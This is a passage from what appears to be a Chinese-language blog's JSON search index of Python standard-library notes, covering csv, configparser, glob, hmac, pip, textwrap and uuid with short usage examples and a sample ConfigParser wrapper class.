newline='') as csvfile:\n    spamreader = csv.reader(csvfile, delimiter=' ', quotechar='|')\n    for row in spamreader:\n        print(', '.join(row))\nSpam, Spam, Spam, Spam, Spam, Baked Beans\nSpam, Lovely Spam, Wonderful Spam csv.writer(csvfile, dialect='excel', **fmtparams) 返回一个 writer 对象，该对象负责将用户的数据在给定的文件类对象上转换为带分隔符的字符串。 csvfile 可以是任何具有 write() 方法的对象。 如果 csvfile 是一个文件对象，则打开它时应使用 newline='' 1。 可以给出可选的 dialect 形参用来定义一组特定 CSV 变种专属的形参。 它可以是 Dialect 类的某个子类的实例或是 list_dialects() 函数所返回的字符串之一。 还可以给出另一个可选的 fmtparams 关键字参数来覆盖当前变种中的单个格式化形参。 有关各个变种和格式化形参的完整细节，请参阅 变种与格式参数 部分。 为了尽量简化与实现 DB API 的模块之间的接口，None 值会被当作空字符串写入。 虽然这个转换是不可逆的，但它可以简化 SQL NULL 数据值到 CSV 文件的转储而无需预处理从 cursor.fetch* 调用返回的数据。 在被写入之前所有其他非字符串数据都会先用 str() 来转转为字符串。 一个简短的用法示例: import csv\nwith open('eggs.csv', 'w', newline='') as csvfile:\n    spamwriter = csv.writer(csvfile, delimiter=' ',\n                            quotechar='|', quoting=csv.QUOTE_MINIMAL)\n    spamwriter.writerow(['Spam'] * 5 + ['Baked Beans'])\n    spamwriter.writerow(['Spam', 'Lovely Spam', 'Wonderful Spam']) csv.register_dialect(name[, dialect[, **fmtparams]]) 将 dialect 与 name 关联起来。 name 必须是字符串。\n变种的指定可以通过传入一个 Dialect 的子类，或通过 fmtparams 关键字参数，或是两者同时传入，\n此时关键字参数会覆盖 dialect 形参。 有关变种和格式化形参的完整细节，请参阅 变种与格式参数 部分。 csv.unregister_dialect(name) 从变种注册表中删除 name 对应的变种。如果 name 不是已注册的变种名称，则抛出 Error 异常。 csv.get_dialect(name) 返回 name 对应的变种。如果 name 不是已注册的变种名称，则抛出 Error 异常。该函数返回的是不可变的 Dialect 对象。 csv.list_dialects() 返回所有已注册变种的名称。 csv.field_size_limit([new_limit]) 返回解析器当前允许的最大字段大小。如果指定了 new_limit，则它将成为新的最大字段大小。 提供的类 DictReader DictWriter Dialect excel excel_tab unix_dialect Sniffer DictReader class csv.DictReader(f, fieldnames=None, restkey=None, restval=None, dialect='excel', *args, **kwds) 创建一个对象，该对象在操作上类似于常规 reader，\n但是将每行中的信息映射到一个 dict，该 dict 的键由 fieldnames 可选参数给出。 f: 文件 fieldnames: fieldnames 参数是一个 sequence。\n如果省略 fieldnames，则文件 f 第一行中的值将用作字段名。无论字段名是如何确定的，字典都将保留其原始顺序。 restkey: 如果某一行中的字段多于字段名，则剩余数据会被放入一个列表，并与 restkey 所指定的字段名 (默认为 None) 一起保存。 restval: 如果某个非空白行的字段少于字段名，则缺失的值会使用 restval 的值来填充 (默认为 None)。 所有其他可选或关键字参数都传递给底层的 reader 实例。 在 3.6 版更改: 返回的行现在的类型是 OrderedDict。 在 3.8 版更改: 现在，返回的行是 dict 类型。 一个简短的用法示例: >>>\nimport csv\nwith open('names.csv', newline='') as csvfile:\n    reader = csv.DictReader(csvfile)\n    for row in reader:\n        print(row['first_name'], row['last_name'])\n\nEric Idle\nJohn Cleese\n\nprint(row)\n{'first_name': 'John', 'last_name': 'Cleese'} DictWriter class csv.DictWriter(f, fieldnames, restval='', extrasaction='raise', dialect='excel', *args, **kwds) 创建一个对象，该对象在操作上类似常规 writer，但会将字典映射到输出行。 fieldnames: fieldnames 参数是由键组成的 序列，它指定字典中值的顺序，\n这些值会按指定顺序传递给 writerow() 方法并写入文件 f。 restval: 如果字典缺少 fieldnames 中的键，则可选参数 restval 用于指定要写入的值。 extrasaction: 如果传递给 writerow() 方法的字典的某些键在 fieldnames 中找不到，则可选参数 extrasaction 用于指定要执行的操作。\n如果将其设置为默认值 'raise'，则会引发 ValueError。\n如果将其设置为 'ignore'，则字典中的其他键值将被忽略。 所有其他可选或关键字参数都传递给底层的 writer 实例。 注意，与 DictReader 类不同， DictWriter 类的 fieldnames 参数不是可选参数。 一个简短的用法示例: import csv\n\nwith open('names.csv', 'w', newline='') as csvfile:\n    fieldnames = ['first_name', 'last_name']\n    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)\n\n    writer.writeheader()\n    writer.writerow({'first_name': 'Baked', 'last_name': 'Beans'})\n    writer.writerow({'first_name': 'Lovely', 'last_name': 'Spam'})\n    writer.writerow({'first_name': 'Wonderful', 'last_name': 'Spam'}) Dialect class csv.Dialect Dialect 类是一个容器类，其属性包含有如何处理双引号、空白符、分隔符等的信息。\n由于缺少严格的 CSV 规格描述，不同的应用程序会产生略有差别的 CSV 数据。\nDialect 实例定义了 reader 和 writer 实例将具有怎样的行为。 所有可用的 Dialect 名称会由 list_dialects() 返回，\n并且它们可由特定的 reader 和 writer 类通过它们的初始化函数 ( __init__ ) 来注册，例如: import csv\n\nwith open('students.csv', 'w', newline='') as csvfile:\n    writer = csv.writer(csvfile, dialect='unix')\n                              &#94;&#94;&#94;&#94;&#94;&#94;&#94;&#94;&#94;&#94;&#94;&#94;&#94;&#94; excel class csv.excel excel 类定义了 Excel 生成的 CSV 文件的常规属性。它在变种注册表中的名称是 'excel'。 excel_tab class csv.excel_tab excel_tab 类定义了 Excel 生成的、制表符分隔的 CSV 文件的常规属性。它在变种注册表中的名称是 'excel-tab'。 unix_dialect class csv.unix_dialect unix_dialect 类定义了在 UNIX 系统上生成的 CSV 文件的常规属性，即使用 'n' 作为换行符，且所有字段都有引号包围。\n它在变种注册表中的名称是 'unix'。 3.2 新版功能. Sniffer class csv.Sniffer Sniffer 类用于推断 CSV 文件的格式。 Sniffer 类提供了两个方法： sniff(sample, delimiters=None) 分析给定的 sample 并返回一个 Dialect 子类，该子类中包含了分析出的格式参数。\n如果给出可选的 delimiters 参数，则该参数会被解释为字符串，该字符串包含了可能的有效定界符。 has_header(sample) 分析 sample 文本（假定为 CSV 格式），如果发现其首行为一组列标题则返回 True。\n在检查每一列时，将考虑是否满足两个关键标准之一来估计 sample 是否包含标题: 第二至第 n 行包含数字值\n第二至第 n 行包含字符串值，其中至少有一个值的长度与该列预期标题的长度不同。\n会对第一行之后的二十行进行采样；如果有超过一半的列 + 行符合标准，则返回 True。\n备注 此方法是一个粗略的启发式方式，有可能产生错误的真值和假值。 使用 Sniffer 的示例: with open('example.csv', newline='') as csvfile:\n    dialect = csv.Sniffer().sniff(csvfile.read(1024))\n    csvfile.seek(0)\n    reader = csv.reader(csvfile, dialect)\n    # ... process CSV file contents here ... 提供的常量 csv.QUOTE_ALL: 指示 writer 对象给所有字段加上引号。 csv.QUOTE_MINIMAL: 指示 writer 对象仅为包含特殊字符（例如 定界符、引号字符 或 行结束符 中的任何字符）的字段加上引号。 csv.QUOTE_NONNUMERIC: 指示 writer 对象为所有非数字字段加上引号。 指示 reader 将所有未用引号引出的字段转换为 float 类型。 csv.QUOTE_NONE: 指示 writer 对象不使用引号引出字段。\n当 定界符 出现在输出数据中时，其前面应该有 转义符。\n如果未设置 转义符，则遇到任何需要转义的字符时，writer 都会抛出 Error 异常。 指示 reader 不对引号字符进行特殊处理。 变种与格式参数 为了更容易指定输入和输出记录的格式, 特定的一组格式参数组合为一个 dialect（变种） 一个 dialect 是一个 Dialect 类的子类，\n它具有一组特定的方法和一个 validate() 方法。\n创建 reader 或 writer 对象时，程序员可以将某个字符串或 Dialect 类的子类指定为 dialect 参数。\n要想补充或覆盖 dialect 参数，程序员还可以单独指定某些格式参数，这些参数的名称与下面 Dialect 类定义的属性相同。 Dialect支持属性 Dialect 类支持以下属性: Dialect.delimiter: 一个用于分隔字段的单字符，默认为 ','。 Dialect.doublequote: 控制出现在字段中的 引号字符 本身应如何被引出。\n当该属性为 True 时，双写引号字符。\n如果该属性为 False，则在 引号字符 的前面放置 转义符。默认值为 True。 在输出时，如果 doublequote 是 False，且 转义符 未指定，且在字段中发现 引号字符 时，会抛出 Error 异常。 Dialect.escapechar: 一个用于 writer 的单字符，用来在 quoting 设置为 QUOTE_NONE 的情况下转义 定界符，\n在 doublequote 设置为 False 的情况下转义 引号字符。\n在读取时，escapechar 去除了其后所跟字符的任何特殊含义。该属性默认为 None，表示禁用转义。 在 3.11 版更改: An empty escapechar is not allowed. Dialect.lineterminator: 放在 writer 产生的行的结尾，默认为 'rn'。 备注 reader 经过硬编码，会识别 'r' 或 'n' 作为行尾，并忽略 lineterminator。未来可能会更改这一行为。 Dialect.quotechar: 一个单字符，用于包住含有特殊字符的字段，特殊字符如 定界符 或 引号字符 或换行符。默认为 '\"'。 在 3.11 版更改: An empty quotechar is not allowed. Dialect.quoting: 控制 writer 何时生成引号，以及 reader 何时识别引号。\n该属性可以等于任何 QUOTE_* 常量（参见 模块内容 段落），默认为 QUOTE_MINIMAL。 Dialect.skipinitialspace: When True, spaces immediately following the delimiter are ignored.\nThe default is False. Dialect.strict: 如果为 True，则在输入错误的 CSV 时抛出 Error 异常。默认值为 False。 Reader 对象 Reader 对象 ( DictReader 实例和 reader() 函数返回的对象) 具有以下公开方法： csvreader.__next__() 返回 reader 的可迭代对象的下一行，\n它可以是一个列表（如果对象是由 reader() 返回）或字典（如果是一个 DictReader 实例），\n根据当前 Dialect 来解析。 通常你应当以 next(reader) 的形式来调用它。 Reader 对象具有以下公开属性： csvreader.dialect: 变种描述，只读，供解析器使用。 csvreader.line_num: 源迭代器已经读取了的行数。它与返回的记录数不同，因为记录可能跨越多行。 DictReader 对象具有以下公开属性： DictReader.fieldnames: 字段名称。如果在创建对象时未传入字段名称，则首次访问时或从文件中读取第一条记录时会初始化此属性。 Writer 对象 Writer 对象（DictWriter 实例和 writer() 函数返回的对象）具有下面的公开方法。\n对于 Writer 对象，行 必须是（一组可迭代的）字符串或数字。\n对于 DictWriter 对象，行 必须是一个字典，这个字典将字段名映射为字符串或数字（数字要先经过 str() 转换类型）。\n请注意，输出的复数会有括号包围。这样其他程序读取 CSV 文件时可能会有一些问题（假设它们完全支持复数）。 csvwriter.writerow(row) 将 row 形参写入到 writer 的文件对象，根据当前 Dialect 进行格式化。 返回对下层文件对象的 write 方法的调用的返回值。 在 3.5 版更改: 开始支持任意类型的迭代器。 csvwriter.writerows(rows) 将 rows*（即能迭代出多个上述 *row 对象的迭代器）中的所有元素写入 writer 的文件对象，并根据当前设置的变种进行格式化。 Writer 对象具有以下公开属性： csvwriter.dialect: 变种描述，只读，供 writer 使用。 DictWriter 对象具有以下公开方法： DictWriter.writeheader() 在 writer 的文件对象中，写入一行字段名称（字段名称在构造函数中指定），并根据当前设置的变种进行格式化。\n本方法的返回值就是内部使用的 csvwriter.writerow() 方法的返回值。 3.2 新版功能. 在 3.8 版更改: 现在 writeheader() 也返回其内部使用的 csvwriter.writerow() 方法的返回值。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-CSV.html","loc":"/yq-docs-rear-end-python-python-standard-library-CSV.html"},{"title":"configparser","text":"介绍 configparser 模块主要是用来读写配置文件的, 比如 ini 类型的文件. 读取结果以节的形式展示, 每一个节下含选项字典 用例 [default] a = 1 b = 2 c = 3 [dev] a = 11 b = 22 c = 33 [test] a = 111 b = 222 c = 333 #  coding: utf-8 # #  Copyright (C) 2022-2022, Inc. All Rights Reserved # #  @Time    : 2022/12/14 下午1:41 #  @Author  : yan que #  @Email   : yanquer@qq.com #  @File    : t_configparser.py #  @Project : mytest import configparser from typing import Dict , List class MyConfig ( object ): _config_path : str _config_parser = configparser . ConfigParser () def _write_file ( self ): with open ( self . _config_path , 'w' ) as f : self . _config_parser . write ( f ) def save ( self ): self . _write_file () def _read_file ( self ): self . _config_parser . read ( self . _config_path , encoding = 'utf-8' ) def __init__ ( self , config_path : str ): self . _config_path = config_path self . _read_file () @property def config_parser ( self ): return self . _config_parser @property def selections ( self ): return self . _config_parser . sections () def has_selection ( self , name : str ): return self . _config_parser . has_section ( name ) def has_option ( self , selection : str , option : str ): return self . _config_parser . has_option ( selection , option ) def add_selection ( self , name : str ): if not self . has_selection ( name ): self . _config_parser . add_section ( name ) def add_options ( self , selection : str , data : Dict [ str , str ]): if self . has_selection ( selection ): for k , v in data . items (): self . _config_parser . set ( selection , k , v ) def remove_selection ( self , name : str ): self . _config_parser . remove_section ( name ) def remove_option ( self , selection : str , data : List [ str ]): if self . has_selection ( selection ): for option in data : self . _config_parser . remove_option ( selection , option ) def main (): my_config = MyConfig ( config_path = './setting.ini' ) # 获取所有的节 print ( '获取所有的节' , my_config . selections ) # 判断是否存在 dev 节 print ( '判断是否存在 dev 节' , my_config . has_selection ( 'dev' )) # 判断是否存在 tt 节 print ( '判断是否存在 tt 节' , my_config . has_selection ( 'tt' )) # 判断 dev 节是否存在 a 选项 print ( '判断 dev 节是否存在 a 选项' , my_config . has_option ( 'dev' , 'a' )) # 判断 dev 节是否存在 aa 选项 print ( '判断 dev 节是否存在 aa 选项' , my_config . has_option ( 'dev' , 'aa' )) # 添加一个 tt 节 print ( '添加一个 tt 节' , my_config . add_selection ( 'tt' ), my_config . selections ) # tt节添加选项 my_config . add_options ( 'tt' , { 'a' : '123' , 'b' : '123' , 'c' : '123' , }) # 读取一个节 print ( '读取 dev 节所有选项' , my_config . config_parser . options ( 'dev' )) # 读取一个节的某个选项 print ( '读取 dev 节 a 选项' , my_config . config_parser . get ( 'dev' , 'a' )) print ( '读取 dev 节 a 选项' , my_config . config_parser . getint ( 'dev' , 'a' )) # 读取一个节所有配置 print ( '读取 dev 节所有配置' , my_config . config_parser . items ( 'dev' )) # 支持直接以字典的形式写入 my_config . config_parser [ 'DEFAULT' ] = { 'ServerAliveInterval' : '45' , 'Compression' : 'yes' , 'CompressionLevel' : '9' } # 保存, 只有保存才会持久化写入到硬盘 my_config . save () 获取所有的节 ['default', 'dev', 'test', 'tt']\n判断是否存在 dev 节 True\n判断是否存在 tt 节 True\n判断 dev 节是否存在 a 选项 True\n判断 dev 节是否存在 aa 选项 False\n添加一个 tt 节 None ['default', 'dev', 'test', 'tt']\n读取 dev 节所有选项 ['a', 'b', 'c']\n读取 dev 节 a 选项 11\n读取 dev 节 a 选项 11\n读取 dev 节所有配置 [('a', '11'), ('b', '22'), ('c', '33')] [DEFAULT] serveraliveinterval = 45 compression = yes compressionlevel = 9 [default] a = 1 b = 2 c = 3 [dev] a = 11 b = 22 c = 33 [test] a = 111 b = 222 c = 333 [tt] a = 123 b = 123 c = 123","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-ConfigParser.html","loc":"/yq-docs-rear-end-python-python-standard-library-ConfigParser.html"},{"title":"glob","text":"glob --- Unix 风格路径名模式扩展 官网: https://docs.python.org/zh-cn/3/library/glob.html glob 模块会按照 Unix shell 所使用的规则找出所有匹配特定模式的路径名称，但返回结果的顺序是不确定的。\n波浪号扩展不会生效，但*, ? 以及用 [] 表示的字符范围将被正确地匹配。\n这是通过配合使用 os.scandir() 和 fnmatch.fnmatch() 函数来实现的，而不是通过实际发起调用子 shell。 glob.glob(pathname, *, root_dir=None, dir_fd=None, recursive=False, include_hidden=False) 如果 root_dir 不为 None，则它应当是指明要搜索的根目录的 path-like object。\n它用在 glob() 上与在调用它之前改变当前目录有相同的效果。 如果 pathname 为相对路径，结果将包含相对于 root_dir 的路径。 本函数带有 dir_fd 参数，支持 基于目录描述符的相对路径。 如果 recursive 为真值，则模式 \"**\" 将匹配目录中的任何文件以及零个或多个目录、子目录和符号链接。\n如果模式加了一个 os.sep 或 os.altsep 则将不匹配文件。 If include_hidden is true, \"**\" pattern will match hidden directories. 引发一个 审计事件 glob.glob 附带参数 pathname, recursive。 引发一个 审计事件 glob.glob/2，附带参数 pathname, recursive, root_dir, dir_fd。 备注 在一个较大的目录树中使用 \"**\" 模式可能会消耗非常多的时间。\n在 3.5 版更改: 支持使用 \"**\" 的递归 glob。 在 3.10 版更改: 添加了 root_dir 和 dir_fd 形参。 在 3.11 版更改: Added the include_hidden parameter. glob.iglob(pathname, *, root_dir=None, dir_fd=None, recursive=False, include_hidden=False) 返回一个 iterator，它会产生与 glob() 相同的结果，但不会实际地同时保存它们。 引发一个 审计事件 glob.glob 附带参数 pathname, recursive。 引发一个 审计事件 glob.glob/2，附带参数 pathname, recursive, root_dir, dir_fd。 在 3.5 版更改: 支持使用 \"**\" 的递归 glob。 在 3.10 版更改: 添加了 root_dir 和 dir_fd 形参。 在 3.11 版更改: Added the include_hidden parameter. glob.escape(pathname) 转义所有特殊字符 ('?', '*' 和 '[')。 这适用于当你想要匹配可能带有特殊字符的任意字符串字面值的情况。\n在 drive/UNC 共享点中的特殊字符不会被转义，\n例如在 Windows 上 escape('//?/c:/Quo vadis?.txt') 将返回 '//?/c:/Quo vadis[?].txt'。 3.4 新版功能.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-Glob.html","loc":"/yq-docs-rear-end-python-python-standard-library-Glob.html"},{"title":"hmac","text":"官网: https://docs.python.org/zh-cn/3/library/hmac.html 基于密钥的消息验证 此模块实现了 HMAC 算法，算法的描述参见 RFC 2104。 常用两个API hmac.new(key, msg=None, digestmod='') 返回一个新的 hmac 对象。\nkey 是一个指定密钥的 bytes 或 bytearray 对象。\n如果提供了 msg，将会调用 update(msg) 方法。\ndigestmod 为 HMAC 对象所用的摘要名称、摘要构造器或模块。\n它可以是适用于 hashlib.new() 的任何名称。 虽然该参数位置靠后，但它却是必须的。 在 3.4 版更改: 形参 key 可以为 bytes 或 bytearray 对象。\n形参 msg 可以为 hashlib 所支持的任意类型。 形参 digestmod 可以为某种哈希算法的名称。 从版本 3.4 起弃用，在版本 3.8 中移除。:\nMD5 作为 digestmod 的隐式默认摘要已被弃用。\ndigestmod 形参现在是必须的。 请将其作为关键字参数传入以避免当你没有初始 msg 时将导致的麻烦。 hmac.digest(key, msg, digest) 基于给定密钥 key 和 digest 返回 msg 的摘要。\n此函数等价于 HMAC(key, msg, digest).digest()，\n但使用了优化的 C 或内联实现，对放入内存的消息能处理得更快。\n形参 key, msg 和 digest 具有与 new() 中相同的含义。 作为 CPython 的实现细节，优化的 C 实现仅当 digest 为字符串\n并且是一个 OpenSSL 所支持的摘要算法的名称时才会被使用。 3.7 新版功能. hmac.compare_digest(a, b) 返回 a == b。 此函数使用一种经专门设计的方式通过避免基于内容的短路行为来防止定时分析，\n使得它适合处理密码。\na 和 b 必须为相同的类型：\n或者是 str (仅限 ASCII 字符，如 HMAC.hexdigest() 的返回值)，\n或者是 bytes-like object。 备注 如果 a 和 b 具有不同的长度，或者如果发生了错误，\n定时攻击在理论上可以获取有关 a 和 b 的类型和长度信息 — 但不能获取它们的值。\n3.3 新版功能. 在 3.10 版更改: 此函数在可能的情况下会在内部使用 OpenSSL 的 CRYPTO_memcmp()。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-HMAC.html","loc":"/yq-docs-rear-end-python-python-standard-library-HMAC.html"},{"title":"pip","text":"一个三方包管理器. 在Ubuntu这种系统上, 可能没有预装需要手动安装: apt install python3-pip -y 查看获取配置文件的位置: pip -v config list","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-PIP.html","loc":"/yq-docs-rear-end-python-python-standard-library-PIP.html"},{"title":"secrets","text":"","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-Secrets.html","loc":"/yq-docs-rear-end-python-python-standard-library-Secrets.html"},{"title":"textwrap","text":"官网: textwrap --- 文本自动换行与填充 textwrap 模块提供了一些快捷函数，以及可以完成所有工作的类 TextWrapper。\n如果你只是要对一两个文本字符串进行自动换行或填充，快捷函数应该就够用了；否则，应该使用 TextWrapper 的实例来提高效率。 快捷函数 wrap fill shorten dedent wrap textwrap.wrap(text, width=70, *, initial_indent='', subsequent_indent='', expand_tabs=True, replace_whitespace=True, fix_sentence_endings=False, break_long_words=True, drop_whitespace=True, break_on_hyphens=True, tabsize=8, max_lines=None, placeholder=' [...]') 对 text (字符串) 中的单独段落自动换行以使每行长度最多为 width 个字符。 返回由输出行组成的列表，行尾不带换行符。 与 TextWrapper 的实例属性对应的可选的关键字参数，具体文档见下。 请参阅 TextWrapper.wrap() 方法了解有关 wrap() 行为的详细信息。 fill textwrap.fill(text, width=70, *, initial_indent='', subsequent_indent='', expand_tabs=True, replace_whitespace=True, fix_sentence_endings=False, break_long_words=True, drop_whitespace=True, break_on_hyphens=True, tabsize=8, max_lines=None, placeholder=' [...]') 对 text 中的单独段落自动换行，并返回一个包含被自动换行段落的单独字符串。 fill() 是以下语句的快捷方式: \"\\n\".join(wrap(text, ...)) 特别要说明的是，fill() 接受与 wrap() 完全相同的关键字参数。 shorten textwrap.shorten(text, width, *, fix_sentence_endings=False, break_long_words=True, break_on_hyphens=True, placeholder=' [...]') 折叠并截短给定的 text 以符合给定的 width。 首先，将折叠 text 中的空格（所有连续空格替换为单个空格）。\n如果结果能适合 width 则将其返回。 否则将丢弃足够数量的末尾单词以使得剩余单词加 placeholder 能适合 width: >>>\ntextwrap.shorten(\"Hello  world!\", width=12)\n'Hello world!'\ntextwrap.shorten(\"Hello  world!\", width=11)\n'Hello [...]'\ntextwrap.shorten(\"Hello world\", width=10, placeholder=\"...\")\n'Hello...' 可选的关键字参数对应于 TextWrapper 的实际属性，具体见下文。\n请注意文本在被传入 TextWrapper 的 fill() 函数之前会被折叠，\n因此改变 tabsize, expand_tabs, drop_whitespace 和 replace_whitespace 的值将没有任何效果。 3.4 新版功能. dedent textwrap.dedent(text) 移除 text 中每一行的任何相同前缀空白符。 这可以用来清除三重引号字符串行左侧空格，而仍然在源码中显示为缩进格式。 请注意制表符和空格符都被视为是空白符，但它们并不相等：以下两行 \"  hello\" 和 \"thello\" 不会被视为具有相同的前缀空白符。 只包含空白符的行会在输入时被忽略并在输出时被标准化为单个换行符。 例如: def test():\n    # end first line with \\ to avoid the empty line!\n    s = '''\\\n    hello\n      world\n    '''\n    print(repr(s))          # prints '    hello\\n      world\\n    '\n    print(repr(dedent(s)))  # prints 'hello\\n  world\\n' indent textwrap.indent(text, prefix, predicate=None) 将 prefix 添加到 text 中选定行的开头。 通过调用 text.splitlines(True) 来对行进行拆分。 默认情况下，prefix 会被添加到所有不是只由空白符（包括任何行结束符）组成的行。 例如: >>>\ns = 'hello\\n\\n \\nworld'\nindent(s, '  ')\n'  hello\\n\\n \\n  world' 可选的 predicate 参数可用来控制哪些行要缩进。 例如，可以很容易地为空行或只有空白符的行添加 prefix: >>>\nprint(indent(s, '+ ', lambda line: True))\n+ hello\n+\n+\n+ world 3.3 新版功能. wrap(), fill() 和 shorten() 的作用方式为创建一个 TextWrapper 实例并在其上调用单个方法。\n该实例不会被重用，因此对于要使用 wrap() 和/或 fill() 来处理许多文本字符串的应用来说，\n创建你自己的 TextWrapper 对象可能会更有效率。 文本最好在空白符位置自动换行，包括带连字符单词的连字符之后；\n长单词仅在必要时会被拆分，除非 TextWrapper.break_long_words 被设为假值。 TextWrapper TextWrapper 类 class textwrap.TextWrapper(**kwargs) TextWrapper 构造器接受多个可选的关键字参数。 每个关键字参数对应一个实例属性，比如说: wrapper = TextWrapper(initial_indent=\"* \") 相当于: wrapper = TextWrapper()\nwrapper.initial_indent = \"* \" 你可以多次重用相同的 TextWrapper 对象，并且你也可以在使用期间通过直接向实例属性赋值来修改它的任何选项。 TextWrapper 的实例属性（以及构造器的关键字参数）如下所示: width: int = 70 自动换行的最大行长度。\n只要输入文本中没有长于 width 的单个单词，TextWrapper 就能保证没有长于 width 个字符的输出行。 expand_tabs: bool = True 如果为真值，则 text 中所有的制表符将使用 text 的 expandtabs() 方法扩展为空格符。 tabsize: int = 8 如果 expand_tabs 为真值，则 text 中所有的制表符将扩展为零个或多个空格，具体取决于当前列位置和给定的制表宽度。 3.3 新版功能. replace_whitespace = True 如果为真值，在制表符扩展之后、自动换行之前，wrap() 方法将把每个空白字符都替换为单个空格。\n会被替换的空白字符如下：制表，换行，垂直制表，进纸和回车 ('\\t\\n\\v\\f\\r') 如果 expand_tabs 为假值且 replace_whitespace 为真值，每个制表符将被替换为单个空格，这与制表符扩展是 不 一样的。 如果 replace_whitespace 为假值，在一行的中间有可能出现换行符并导致怪异的输出。\n因此，文本应当（使用 str.splitlines() 或类似方法）拆分为段落并分别进行自动换行。 drop_whitespace = True 如果为真值，每一行开头和末尾的空白字符（在包装之后、缩进之前）会被丢弃。\n但是段落开头的空白字符如果后面不带任何非空白字符则不会被丢弃。 如果被丢弃的空白字符占据了一个整行，则该整行将被丢弃。 initial_indent = '' 将被添加到被自动换行输出内容的第一行的字符串。 其长度会被计入第一行的长度。 空字符串不会被缩进。 subsequent_indent = '' 将被添加到被自动换行输出内容除第一行外的所有行的字符串。 其长度会被计入除行一行外的所有行的长度。 fix_sentence_endings = False 如果为真值，TextWrapper 将尝试检测句子结尾并确保句子间总是以恰好两个空格符分隔。\n对于使用等宽字体的文本来说通常都需要这样。\n但是，句子检测算法并不完美：它假定句子结尾是一个小写字母加字符 '.', '!' 或 '?' 中的一个，\n并可能带有字符 '\"' 或 \"'\"，最后以一个空格结束。 此算法的问题之一是它无法区分以下文本中的 \"Dr.\" [...] Dr. Frankenstein's monster [...] 和以下文本中的 \"Spot.\" [...] See Spot. See Spot run [...] fix_sentence_endings 默认为假值。 由于句子检测算法依赖于 string.lowercase 来确定\"小写字母\"，\n以及约定在句点后使用两个空格来分隔处于同一行的句子，因此只适用于英语文本。 break_long_words = True 如果为真值，则长度超过 width 的单词将被分开以保证行的长度不会超过 width。\n如果为假值，超长单词不会被分开，因而某些行的长度可能会超过 width。\n（超长单词将被单独作为一行，以尽量减少超出 width 的情况。） break_on_hyphens = True 如果为真值，将根据英语的惯例首选在空白符和复合词的连字符之后自动换行。\n如果为假值，则只有空白符会被视为合适的潜在断行位置，但如果你确实不希望出现分开的单词则你必须将 break_long_words 设为假值。\n之前版本的默认行为总是允许分开带有连字符的单词。 max_lines = None 如果不为 None，则输出内容将最多包含 max_lines 行，并使 placeholder 出现在输出内容的末尾。 3.4 新版功能. placeholder (默认: ' [...]') 该文本将在输出文本被截短时出现在文本末尾。 3.4 新版功能. TextWrapper 还提供了一些公有方法，类似于模块层级的便捷函数: wrap(text) 对 text (字符串) 中的单独段落自动换行以使每行长度最多为 width 个字符。 所有自动换行选项均获取自 TextWrapper 实例的实例属性。 返回由输出行组成的列表，行尾不带换行符。 如果自动换行输出结果没有任何内容，则返回空列表。 fill(text) 对 text 中的单独段落自动换行并返回包含被自动换行段落的单独字符串。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-Textwrap.html","loc":"/yq-docs-rear-end-python-python-standard-library-Textwrap.html"},{"title":"uuid","text":"官网文档:: uuid RFC 4122 定义的UUID对象 提供了不可变的 UUID 对象 (UUID 类) 以及: uuid1 , uuid3 , uuid4 , uuid5 等函数用于生成 RFC 4122 所定义的第 1, 3, 4 和 5 版 UUID. 使用方面: Python中没有基于DCE的，所以uuid2可以忽略； uuid4存在概率性重复，由无映射性，最好不用； 若在Global的分布式计算环境下，最好用uuid1； 若有名字的唯一性要求，最好用uuid3或uuid5。 主要的类 SafeUUID class uuid.SafeUUID safe 该UUID是由平台以多进程安全的方式生成的. unsafe UUID不是以多进程安全的方式生成的. unknown 该平台不提供UUID是否安全生成的信息. class uuid.UUID(hex=None, bytes=None, bytes_le=None, fields=None, int=None, version=None, *, is_safe=SafeUUID.unknown) bytes 一串32位十六进制数字、一串大端序16个字节作为 bytes 参数 bytes_le 一串16个小端序字节作为 bytes_le 参数、 fields 一个由六个整数组成的元组 time_low: 32位;\ntime_mid: 16位;\ntime_hi_version: 16位;\nclock_seq_hi_variant: 8位;\nclock_seq_low: 8位;\nnode: 48位. int 一个128位整数 当给出一串十六进制数字时，大括号、连字符和URN前缀都是可选的. 以上参数都是任选的. 例如，这些表达式都产生相同的UUID: UUID('{12345678-1234-5678-1234-567812345678}')\nUUID('12345678123456781234567812345678')\nUUID('urn:uuid:12345678-1234-5678-1234-567812345678')\nUUID(bytes=b'\\x12\\x34\\x56\\x78'*4)\nUUID(bytes_le=b'\\x78\\x56\\x34\\x12\\x34\\x12\\x78\\x56' +\n              b'\\x12\\x34\\x56\\x78\\x12\\x34\\x56\\x78')\nUUID(fields=(0x12345678, 0x1234, 0x5678, 0x12, 0x34, 0x567812345678))\nUUID(int=0x12345678123456781234567812345678) 必须给出 hex、bytes、bytes_le、fields 或 int 中的唯一一个. version 参数是可选的；\n如果给定，产生的UUID将根据 RFC 4122 设置其变体和版本号，覆盖给定的 hex、bytes、bytes_le、fields 或 int 中的位. UUID 对象的比较是通过比较它们的 UUID.int 属性进行的. 与非 UUID 对象的比较会引发 TypeError. str(uuid) 返回一个 12345678-1234-5678-1234-567812345678 形式的字符串，其中 32 位十六进制数字代表 UUID. 具有的只读属性 UUID.bytes UUID是一个16字节的字符串（包含6个大端字节序的整数字段）. UUID.bytes_le UUID 是一个 16 字节的字符串（其中 time_low、time_mid 和 time_hi_version 为小端字节顺序）. UUID.fields 以元组形式存放的UUID的6个整数域，有六个单独的属性和两个派生属性： 域 含意 time_low UUID的前32位 time_mid 接前一域的16位 time_hi_version 接前一域的16位 clock_seq_hi_variant 接前一域的8位 clock_seq_low 接前一域的8位 node UUID的最后48位 time UUID的总长60位的时间戳 clock_seq 14位的序列号 UUID.hex UUID 是一个 32 字符的小写十六进制数码字符串. 与直接 str 转换的效果类似: a = uuid.uuid4()\na\nOut[10]: UUID('a7de0199-3e5e-4d84-8fd3-5f65052db9b5')\n# convert a UUID to a string of hex digits in standard form\nstr(a)\nOut[11]: 'a7de0199-3e5e-4d84-8fd3-5f65052db9b5'\na.hex\nOut[12]: 'a7de01993e5e4d848fd35f65052db9b5' UUID.int UUID是一个128位的整数. UUID.urn 在 RFC 4122 中定义的 URN 形式的 UUID. UUID.variant 